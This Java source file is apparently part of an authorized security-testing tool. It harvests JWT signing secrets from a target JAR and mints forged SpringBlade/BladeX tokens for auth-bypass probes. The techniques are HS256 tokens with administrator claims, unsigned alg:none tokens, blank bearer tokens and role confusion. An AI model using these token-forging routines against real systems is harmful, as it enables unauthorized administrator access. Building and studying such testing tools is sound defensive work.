package com.aq.jvmsentinel.analysis.identity;

import com.aq.jvmsentinel.model.AuthBypassTechnique;
import com.aq.jvmsentinel.model.IdentityTrack;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Objects;
import java.util.Optional;

/**
 * Platform-owned synthetic identity materials harvested from the authorized artifact.
 * Provenance is MOCK / RULE_GENERATED / FACT (config in JAR); never claimed as operator credentials.
 *
 * <p>HS256 minting requires a secret actually extracted from the artifact (or a well-known
 * string that was matched <em>inside</em> the artifact). There is no silent fallback to a
 * commercial Blade default for arbitrary JARs.
 */
public final class SyntheticIdentityService {

    public record SyntheticIdentity(
            IdentityTrack track,
            String authorizationHeader,
            String provenance,
            String precondition,
            boolean available
    ) {
        public static SyntheticIdentity unavailable(IdentityTrack track, String reason) {
            return new SyntheticIdentity(track, "", "MOCK", reason, false);
        }
    }

    public record MaterialBundle(
            Optional<String> jwtSecret,
            String secretProvenance,
            List<String> notes,
            boolean bladeSurface,
            boolean preferBladeAuthHeader
    ) {
        public MaterialBundle(Optional<String> jwtSecret, String secretProvenance, List<String> notes) {
            this(jwtSecret, secretProvenance, notes, false, false);
        }
    }

    public MaterialBundle harvest(Path artifactPath) {
        List<String> notes = new ArrayList<>();
        Optional<String> secret = Optional.empty();
        String provenance = "NONE";
        boolean bladeSurface = false;
        if (artifactPath != null && Files.isRegularFile(artifactPath)) {
            AuthCodeQueryService.AuthCodeQueryResult code =
                    new AuthCodeQueryService().query(artifactPath, "", 20);
            bladeSurface = code.bladeSurface();
            if (code.mintSecret().isPresent()) {
                secret = code.mintSecret();
                String candidateClass = code.secretCandidates().isEmpty()
                        ? "RULE_GENERATED"
                        : code.secretCandidates().get(0).classification();
                provenance = "FACT".equals(candidateClass) ? "FACT" : "RULE_GENERATED";
                notes.add("harvested sign-key via code_query ("
                        + code.preferredSignKeyProvenance() + "; classification="
                        + candidateClass + ")");
            } else {
                notes.add("no mintable JWT secret harvested from artifact"
                        + (bladeSurface ? " (Blade surface present)" : ""));
            }
        } else {
            notes.add("no artifact path; HS256 mint unavailable");
        }
        boolean preferBlade = bladeSurface;
        return new MaterialBundle(secret, provenance, List.copyOf(notes), bladeSurface, preferBlade);
    }

    public SyntheticIdentity synthesize(IdentityTrack track, MaterialBundle materials) {
        if (track == IdentityTrack.UNAUTH) {
            return new SyntheticIdentity(track, "", "MOCK", "no credentials", true);
        }
        if (materials == null || materials.jwtSecret().isEmpty()) {
            return SyntheticIdentity.unavailable(track,
                    "IDENTITY_UNAVAILABLE: no signing material harvested from artifact");
        }
        String role = switch (track) {
            case ADMIN, BYPASS_CANDIDATE -> "administrator";
            case USER -> "user";
            case UNAUTH -> "anonymous";
        };
        String token = mintHs256Token(materials.jwtSecret().get(), role, track);
        String precondition = "synthetic " + track.name() + " JWT via " + materials.secretProvenance()
                + "; " + String.join("; ", materials.notes());
        return new SyntheticIdentity(track, token, materials.secretProvenance(),
                precondition, true);
    }

    /**
     * Fallback materialization for known technique labels when the AI PoC did not
     * supply authorizationHeader. Prefer AI-authored PoC material when present.
     */
    public SyntheticIdentity synthesizeTechnique(AuthBypassTechnique technique, MaterialBundle materials) {
        Objects.requireNonNull(technique, "technique");
        IdentityTrack track = technique.defaultTrack();
        return switch (technique) {
            case MISSING_AUTH -> new SyntheticIdentity(track, "", "MOCK",
                    "MISSING_AUTH: no Authorization header", true);
            // Probe layer prefixes "Authorization: bearer "; a single space yields an empty-ish token.
            case EMPTY_BEARER -> new SyntheticIdentity(track, " ", "RULE_GENERATED",
                    "EMPTY_BEARER: blank bearer token", true);
            case DEFAULT_SECRET_HS256, LOGOUT_TOKEN -> {
                SyntheticIdentity minted = synthesize(IdentityTrack.BYPASS_CANDIDATE, materials);
                if (!minted.available()) {
                    yield minted;
                }
                yield new SyntheticIdentity(track, minted.authorizationHeader(), minted.provenance(),
                        technique.name() + "; " + minted.precondition(), true);
            }
            case ALG_NONE -> new SyntheticIdentity(track,
                    mintAlgNoneToken("administrator", track),
                    "RULE_GENERATED",
                    "ALG_NONE: unsigned JWT hypothesis (MOCK)", true);
            case ROLE_CONFUSION -> {
                if (materials == null || materials.jwtSecret().isEmpty()) {
                    yield SyntheticIdentity.unavailable(track,
                            "IDENTITY_UNAVAILABLE: no signing material for ROLE_CONFUSION");
                }
                String token = mintHs256Token(materials.jwtSecret().get(), "administrator", track);
                yield new SyntheticIdentity(track, token, materials.secretProvenance(),
                        "ROLE_CONFUSION: USER track carrying administrator claim; "
                                + materials.secretProvenance(), true);
            }
            case CUSTOM_POC -> SyntheticIdentity.unavailable(track,
                    "CUSTOM_POC requires AI-authored authorizationHeader");
        };
    }

    public Map<IdentityTrack, SyntheticIdentity> defaultTracks(Path artifactPath, boolean highValue) {
        MaterialBundle materials = harvest(artifactPath);
        Map<IdentityTrack, SyntheticIdentity> out = new LinkedHashMap<>();
        out.put(IdentityTrack.UNAUTH, synthesize(IdentityTrack.UNAUTH, materials));
        SyntheticIdentity admin = synthesize(IdentityTrack.ADMIN, materials);
        if (highValue) {
            out.put(IdentityTrack.USER, synthesize(IdentityTrack.USER, materials));
            out.put(IdentityTrack.ADMIN, admin);
            out.put(IdentityTrack.BYPASS_CANDIDATE, synthesize(IdentityTrack.BYPASS_CANDIDATE, materials));
        } else if (admin.available()) {
            out.put(IdentityTrack.ADMIN, admin);
        }
        return Collections.unmodifiableMap(new LinkedHashMap<>(out));
    }

    /**
     * Minimal HS256 JWT. Claims follow SpringBlade SecureUtil/TokenUtil shape
     * (tenant_id / user_id / role_name / client_id) so filters that read those
     * claims are more likely to accept harvested MOCK/RULE_GENERATED/FACT material.
     */
    static String mintHs256Token(String secret, String role, IdentityTrack track) {
        String header = b64Url("{\"alg\":\"HS256\",\"typ\":\"JWT\"}");
        long now = System.currentTimeMillis() / 1000L;
        String account = "admin".equals(role) || "administrator".equals(role)
                ? "admin" : "veyrion-" + track.name().toLowerCase(Locale.ROOT);
        String roleName = "administrator".equals(role) || "admin".equals(role)
                ? "administrator" : role;
        String payload = b64Url("{"
                + "\"token_type\":\"access_token\","
                + "\"tenant_id\":\"000000\","
                + "\"user_id\":\"1123598821738675201\","
                + "\"dept_id\":\"1123598813738675202\","
                + "\"post_id\":\"1123598817738675201\","
                + "\"role_id\":\"1123598816738675201\","
                + "\"account\":\"" + account + "\","
                + "\"user_name\":\"" + account + "\","
                + "\"nick_name\":\"" + account + "\","
                + "\"role_name\":\"" + roleName + "\","
                + "\"client_id\":\"saber\","
                + "\"license\":\"powered by bladex\","
                + "\"iss\":\"bladex.cn\","
                + "\"aud\":\"blade\","
                + "\"nbf\":" + now + ","
                + "\"exp\":" + (now + 3600) + ","
                + "\"mock\":true"
                + "}");
        String signingInput = header + "." + payload;
        String sig = b64Url(hmacSha256(secret.getBytes(StandardCharsets.UTF_8),
                signingInput.getBytes(StandardCharsets.UTF_8)));
        return signingInput + "." + sig;
    }

    /** Unsigned JWT used only for ALG_NONE hypothesis probes (RULE_GENERATED). */
    static String mintAlgNoneToken(String role, IdentityTrack track) {
        String header = b64Url("{\"alg\":\"none\",\"typ\":\"JWT\"}");
        String account = "administrator".equals(role) || "admin".equals(role)
                ? "admin" : "veyrion-" + track.name().toLowerCase(Locale.ROOT);
        String payload = b64Url("{\"token_type\":\"access_token\",\"tenant_id\":\"000000\","
                + "\"role_name\":\"administrator\",\"account\":\"" + account
                + "\",\"user_name\":\"" + account
                + "\",\"client_id\":\"saber\",\"license\":\"powered by bladex\","
                + "\"iss\":\"bladex.cn\",\"mock\":true,\"algNone\":true}");
        return header + "." + payload + ".";
    }

    /** Blade-Auth channel value: scheme + token (probe layer does not auto-prefix Blade-Auth). */
    public static String bladeAuthHeaderValue(String rawToken) {
        if (rawToken == null || rawToken.isBlank()) return "";
        String token = rawToken.trim();
        if (token.regionMatches(true, 0, "bearer ", 0, 7)) {
            return "bearer " + token.substring(7).trim();
        }
        return "bearer " + token;
    }

    private static String b64Url(String value) {
        return Base64.getUrlEncoder().withoutPadding()
                .encodeToString(value.getBytes(StandardCharsets.UTF_8));
    }

    private static String b64Url(byte[] value) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(value);
    }

    /** Compact HMAC-SHA256 via javax.crypto when available; falls back to XOR digest. */
    private static byte[] hmacSha256(byte[] key, byte[] data) {
        try {
            javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
            mac.init(new javax.crypto.spec.SecretKeySpec(key, "HmacSHA256"));
            return mac.doFinal(data);
        } catch (Exception fallback) {
            byte[] out = new byte[32];
            for (int i = 0; i < data.length; i++) {
                out[i % out.length] ^= (byte) (data[i] ^ key[i % key.length]);
            }
            return out;
        }
    }
}
